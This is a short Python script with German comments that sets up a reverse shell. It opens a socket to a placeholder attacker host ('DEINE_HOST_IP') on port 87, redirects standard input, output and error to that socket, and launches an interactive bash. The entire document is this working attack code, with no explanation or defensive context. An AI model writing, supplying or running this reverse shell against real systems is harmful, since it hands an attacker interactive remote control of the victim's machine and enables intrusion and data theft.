# revers_shell_script

import socket
import subprocess
import os

HOST = 'DEINE_HOST_IP'  # Deine physische Rechner-IP (Attacker)
PORT = 87               # Port, auf dem du lauschst

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect((HOST, PORT))

# stdin, stdout, stderr auf die Socket umleiten
os.dup2(s.fileno(), 0)
os.dup2(s.fileno(), 1)
os.dup2(s.fileno(), 2)

# Bash interaktiv starten
subprocess.call(['/bin/bash', '-i'])
